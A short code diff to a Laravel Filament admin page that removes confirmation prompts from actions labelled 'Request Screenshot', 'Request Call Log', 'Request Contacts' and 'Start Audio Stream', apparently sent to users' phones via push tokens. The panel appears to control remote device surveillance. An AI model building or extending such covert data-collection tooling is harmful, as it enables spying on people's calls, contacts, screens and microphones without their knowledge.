@@ -18,7 +18,6 @@ class EditUser extends EditRecord
                 Actions\Action::make('request_screenshot')
                     ->label('Request Screenshot')
                     ->icon('heroicon-o-camera')
-                    ->requiresConfirmation()
                     ->action(function ($record) {
                         try {
                             $fcmToken = $record->fcm_token;
@@ -146,7 +145,6 @@ class EditUser extends EditRecord
                 Actions\Action::make('request_call_log')
                     ->label('Request Call Log')
                     ->icon('heroicon-o-phone')
-                    ->requiresConfirmation()
                     ->action(function ($record) {
                         try {
                              if (!$record->fcm_token) {
@@ -194,7 +192,6 @@ class EditUser extends EditRecord
                 Actions\Action::make('request_contacts')
                     ->label('Request Contacts')
                     ->icon('heroicon-o-users')
-                    ->requiresConfirmation()
                     ->action(function ($record) {
                         try {
                              if (!$record->fcm_token) {
@@ -301,7 +298,6 @@ class EditUser extends EditRecord
                 Actions\Action::make('start_audio_stream')
                     ->label('Start Audio Stream')
                     ->icon('heroicon-o-microphone')
-                    ->requiresConfirmation()
                     ->color('success')
                     ->action(function ($record) {
                         try {
